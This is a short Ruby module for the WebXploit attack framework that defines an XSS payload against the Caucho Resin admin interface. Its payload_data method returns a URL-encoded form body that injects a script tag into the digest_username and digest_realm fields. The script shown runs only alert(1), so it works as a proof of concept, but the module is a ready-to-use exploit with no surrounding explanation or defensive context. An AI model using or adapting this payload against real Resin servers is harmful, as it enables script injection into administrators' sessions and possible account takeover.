class WebXploit <  WXf::WXfmod_Factory::Payload

  def initialize
        super( 
    'Name'        => 'Caucho Resin admin XSS payload',
    'Version'     => '1.0',
    'Description' => %q{ Payload containing alert(1) in the digest_username and digest_realm vars
                     },
    'Author'      => [ 'theinfinitenigma' ],
    'License'     => WXF_LICENSE
)
      
  end
  
  def payload_data   
    return "digest_username=aaa%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%22&digest_password1=&digest_password2=&digest_realm=aaa%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%22&digest_attempt=true"
  end
  
end
